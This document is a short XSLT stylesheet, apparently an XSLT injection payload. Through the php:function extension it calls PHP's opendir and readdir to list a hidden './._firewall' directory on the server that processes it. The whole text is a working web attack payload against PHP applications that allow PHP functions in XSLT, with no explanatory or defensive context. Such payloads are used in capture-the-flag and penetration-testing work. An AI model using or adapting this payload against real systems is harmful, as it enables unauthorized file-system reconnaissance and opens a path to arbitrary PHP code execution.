<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl"
                version="1.0">
  
  <xsl:template match="/">
    <!-- Open the ._firewall directory -->
    <xsl:value-of select="php:function('opendir', './._firewall')"/>
    <pre>
    Contents of ._firewall:
    Entry 1: <xsl:value-of select="php:function('readdir')"/>
    Entry 2: <xsl:value-of select="php:function('readdir')"/>
    Entry 3: <xsl:value-of select="php:function('readdir')"/>
    Entry 4: <xsl:value-of select="php:function('readdir')"/>
    Entry 5: <xsl:value-of select="php:function('readdir')"/>
    </pre>
    <xsl:value-of select="php:function('closedir')"/>
  </xsl:template>

</xsl:stylesheet>
